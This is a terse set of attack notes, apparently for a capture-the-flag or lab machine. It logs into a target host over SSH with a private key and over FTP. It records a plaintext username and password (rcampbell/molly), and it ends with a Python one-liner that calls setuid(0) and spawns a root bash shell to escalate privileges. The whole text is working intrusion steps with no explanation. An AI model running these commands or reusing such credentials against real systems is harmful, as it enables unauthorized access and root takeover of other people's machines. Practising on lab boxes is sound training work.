export ip=<ip>

chmod 600 id_rsa
ssh -i id_rsa gcrawford@$ip

ftp $ip
ssh rcampbell@$ip

username: rcampbell
password: molly


get root
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
